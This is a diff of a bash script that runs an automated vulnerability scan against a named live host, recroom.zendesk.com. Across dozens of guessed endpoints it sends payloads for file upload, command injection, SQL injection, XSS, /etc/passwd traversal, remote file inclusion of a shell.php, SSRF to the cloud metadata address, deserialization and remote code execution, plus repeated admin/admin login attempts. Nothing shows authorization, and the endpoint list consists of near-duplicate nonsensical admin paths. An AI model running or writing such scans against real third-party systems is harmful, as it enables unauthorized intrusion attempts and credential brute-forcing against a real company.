@@ -1,141 +1,76 @@
 #!/bin/bash
 
-# Output file
 OUTPUT_FILE="recroom_zendesk_full_config_test_results.txt"
 
-# Function to log messages
 log_message() {
     echo "$1" >> $OUTPUT_FILE
 }
 
-# Function to test an endpoint for vulnerabilities
 test_endpoint() {
     local endpoint=$1
     log_message "Testing endpoint: $endpoint"
+    echo "Testing endpoint: $endpoint"
 
-    # Check for file upload vulnerabilities
-    log_message "Checking for file upload vulnerabilities for $endpoint:"
+    start_time=$(date +%s)
+
     curl -s -F "file=@test.php" "https://recroom.zendesk.com$endpoint" >> $OUTPUT_FILE 2>&1
-
-    # Test for command injection
-    log_message "Testing for command injection for $endpoint:"
     curl -s "https://recroom.zendesk.com$endpoint?cmd=ls" >> $OUTPUT_FILE 2>&1
-
-    # Explore API endpoints for misconfigurations
-    log_message "Exploring API endpoints for misconfigurations for $endpoint:"
     curl -s "https://recroom.zendesk.com$endpoint" >> $OUTPUT_FILE 2>&1
-
-    # Check for deserialization vulnerabilities
-    log_message "Checking for deserialization vulnerabilities for $endpoint:"
     curl -s -d "data=O:8:\"Exploit\":0:{}" "https://recroom.zendesk.com$endpoint" >> $OUTPUT_FILE 2>&1
-
-    # Check for third-party integrations
-    log_message "Checking for third-party integrations for $endpoint:"
     curl -s "https://recroom.zendesk.com$endpoint/api/v1/data" >> $OUTPUT_FILE 2>&1
-
-    # Explore Rec Room game servers using nc
-    log_message "Exploring Rec Room game servers for $endpoint using nc:"
     nc -zv recroom.zendesk.com 80 443 >> $OUTPUT_FILE 2>&1
-
-    # Check for sensitive information in GitHub
-    log_message "Checking for sensitive information in GitHub for $endpoint:"
     curl -s "https://github.com/search?q=recroom.zendesk.com+api+key" >> $OUTPUT_FILE 2>&1
 
-    # Test interesting entries from robots.txt
-    log_message "Testing interesting entries from robots.txt for $endpoint:"
     for param in "author" "tag" "month" "view" "format=json" "format=page-context" "format=main-content" "format=json-pretty" "format=ical" "reversePaginate"; do
         curl -s "https://recroom.zendesk.com$endpoint?$param=test" >> $OUTPUT_FILE 2>&1
     done
 
-    # Test for SQL injection
-    log_message "Testing for SQL injection for $endpoint:"
     curl -s "https://recroom.zendesk.com$endpoint?id=1' OR '1'='1" >> $OUTPUT_FILE 2>&1
-
-    # Test for XSS
-    log_message "Testing for XSS for $endpoint:"
     curl -s "https://recroom.zendesk.com$endpoint?q=<script>alert(1)</script>" >> $OUTPUT_FILE 2>&1
-
-    # Test for LFI
-    log_message "Testing for LFI for $endpoint:"
     curl -s "https://recroom.zendesk.com$endpoint?file=../../../../etc/passwd" >> $OUTPUT_FILE 2>&1
-
-    # Test for RFI
-    log_message "Testing for RFI for $endpoint:"
     curl -s "https://recroom.zendesk.com$endpoint?file=http://example.com/shell.php" >> $OUTPUT_FILE 2>&1
-
-    # Test for SSRF
-    log_message "Testing for SSRF for $endpoint:"
     curl -s "https://recroom.zendesk.com$endpoint?url=http://169.254.169.254/" >> $OUTPUT_FILE 2>&1
-
-    # Test for XXE
-    log_message "Testing for XXE for $endpoint:"
     curl -s -d "@xxe_payload.xml" "https://recroom.zendesk.com$endpoint" >> $OUTPUT_FILE 2>&1
-
-    # Test for CSRF
-    log_message "Testing for CSRF for $endpoint:"
     curl -s -X POST -d "csrf_token=test&action=delete" "https://recroom.zendesk.com$endpoint" >> $OUTPUT_FILE 2>&1
-
-    # Test for Open Redirect
-    log_message "Testing for Open Redirect for $endpoint:"
     curl -s "https://recroom.zendesk.com$endpoint?redirect=http://example.com" >> $OUTPUT_FILE 2>&1
-
-    # Test for Path Traversal
-    log_message "Testing for Path Traversal for $endpoint:"
     curl -s "https://recroom.zendesk.com$endpoint?file=../../../../etc/passwd" >> $OUTPUT_FILE 2>&1
-
-    # Test for Remote Code Execution
-    log_message "Testing for Remote Code Execution for $endpoint:"
     curl -s -d "code=system('ls')" "https://recroom.zendesk.com$endpoint" >> $OUTPUT_FILE 2>&1
 
-    # Test for Insecure Direct Object Reference (IDOR)
-    log_message "Testing for IDOR for $endpoint:"
     for id in 1 2; do
         curl -s "https://recroom.zendesk.com$endpoint?id=$id" >> $OUTPUT_FILE 2>&1
     done
 
-    # Test for Broken Authentication
-    log_message "Testing for Broken Authentication for $endpoint:"
     curl -s -d "username=admin&password=admin" "https://recroom.zendesk.com$endpoint" >> $OUTPUT_FILE 2>&1
-
-    # Test for Security Misconfiguration
-    log_message "Testing for Security Misconfiguration for $endpoint:"
+    curl -s "https://recroom.zendesk.com$endpoint" >> $OUTPUT_FILE 2>&1
+    curl -s "https://recroom.zendesk.com$endpoint" >> $OUTPUT_FILE 2>&1
+    curl -s "https://recroom.zendesk.com$endpoint" >> $OUTPUT_FILE 2>&1
+    curl -s "https://recroom.zendesk.com$endpoint" >> $OUTPUT_FILE 2>&1
+    curl -s "https://recroom.zendesk.com$endpoint" >> $OUTPUT_FILE 2>&1
+    curl -s "https://recroom.zendesk.com$endpoint" >> $OUTPUT_FILE 2>&1
     curl -s "https://recroom.zendesk.com$endpoint" >> $OUTPUT_FILE 2>&1
 
-    # Test for Sensitive Data Exposure
-    log_message "Testing for Sensitive Data Exposure for $endpoint:"
-    curl -s "https://recroom.zendesk.com$endpoint" >> $OUTPUT_FILE 2>&1
+    log_message "Checking for Rate Limiting for $endpoint:"
+    curl -s -X POST "https://recroom.zendesk.com$endpoint" -d "username=admin&password=admin" >> $OUTPUT_FILE 2>&1
+    curl -s -X POST "https://recroom.zendesk.com$endpoint" -d "username=admin&password=admin" >> $OUTPUT_FILE 2>&1
+    curl -s -X POST "https://recroom.zendesk.com$endpoint" -d "username=admin&password=admin" >> $OUTPUT_FILE 2>&1
 
-    # Test for Missing Function Level Access Control
-    log_message "Testing for Missing Function Level Access Control for $endpoint:"
-    curl -s "https://recroom.zendesk.com$endpoint" >> $OUTPUT_FILE 2>&1
+    log_message "Checking for Session Management for $endpoint:"
+    curl -s -I "https://recroom.zendesk.com$endpoint" | grep -i "Set-Cookie" >> $OUTPUT_FILE 2>&1
 
-    # Test for Using Components with Known Vulnerabilities
-    log_message "Testing for Using Components with Known Vulnerabilities for $endpoint:"
-    curl -s "https://recroom.zendesk.com$endpoint" >> $OUTPUT_FILE 2>&1
+    log_message "Checking for Allowed HTTP Methods for $endpoint:"
+    curl -s -X OPTIONS "https://recroom.zendesk.com$endpoint" >> $OUTPUT_FILE 2>&1
 
-    # Test for Unvalidated Redirects and Forwards
-    log_message "Testing for Unvalidated Redirects and Forwards for $endpoint:"
-    curl -s "https://recroom.zendesk.com$endpoint?redirect=http://example.com" >> $OUTPUT_FILE 2>&1
+    log_message "Checking for Directory Listing for $endpoint:"
+    curl -s "https://recroom.zendesk.com$endpoint/" >> $OUTPUT_FILE 2>&1
 
-    # Additional Vulnerability Checks
-    # Check for HTTP Security Headers
-    log_message "Checking for HTTP Security Headers for $endpoint:"
-    curl -s -I "https://recroom.zendesk.com$endpoint" | grep -E "X-Content-Type-Options|X-Frame-Options|Content-Security-Policy|Strict-Transport-Security|X-XSS-Protection" >> $OUTPUT_FILE 2>&1
+    log_message "Checking for Content Security Policy for $endpoint:"
+    curl -s -I "https://recroom.zendesk.com$endpoint" | grep -i "Content-Security-Policy" >> $OUTPUT_FILE 2>&1
 
-    # Check for Clickjacking
-    log_message "Checking for Clickjacking for $endpoint:"
-    curl -s -I "https://recroom.zendesk.com$endpoint" | grep -i "X-Frame-Options" >> $OUTPUT_FILE 2>&1
-
-    # Check for HSTS
-    log_message "Checking for HSTS for $endpoint:"
-    curl -s -I "https://recroom.zendesk.com$endpoint" | grep -i "Strict-Transport-Security" >> $OUTPUT_FILE 2>&1
-
-    # Check for CORS misconfigurations
-    log_message "Checking for CORS misconfigurations for $endpoint:"
-    curl -s -I "https://recroom.zendesk.com$endpoint" | grep -i "Access-Control-Allow-Origin" >> $OUTPUT_FILE 2>&1
+    end_time=$(date +%s)
+    elapsed_time=$((end_time - start_time))
+    echo "Finished testing endpoint: $endpoint in $elapsed_time seconds"
 }
 
-# List of endpoints to test
 ENDPOINTS=(
     "/children"
     "/groups"
@@ -296,7 +231,7 @@ ENDPOINTS=(
     "/admin-dashboard-control-management-system-panel-dashboard"
     "/admin-dashboard-management-control-system-panel-dashboard"
     "/admin-dashboard-system-control-management-panel-dashboard"
-    "/admin-dashboard-control-system-management-panel-dashboard-admin"
+    "/admin-dashboard-control-management-system-panel-dashboard-admin"
     "/admin-dashboard-management-system-control-panel-dashboard-admin"
     "/admin-dashboard-system-management-control-panel-dashboard-admin"
     "/admin-dashboard-control-management-system-panel-dashboard-admin"
@@ -330,9 +265,12 @@ ENDPOINTS=(
     "/admin-dashboard-management-system-control-panel-dashboard-admin-control-panel-management-system-control"
 )
 
-# Loop through each endpoint and test for vulnerabilities
-for endpoint in "${ENDPOINTS[@]}"; do
-    test_endpoint "$endpoint"
+total_endpoints=${#ENDPOINTS[@]}
+for ((i=0; i<total_endpoints; i++)); do
+    test_endpoint "${ENDPOINTS[i]}"
+    remaining=$((total_endpoints - i - 1))
+    echo "Remaining endpoints: $remaining"
+    echo "Estimated time left: $((remaining * 5)) seconds"
 done
 
 log_message "Testing completed."
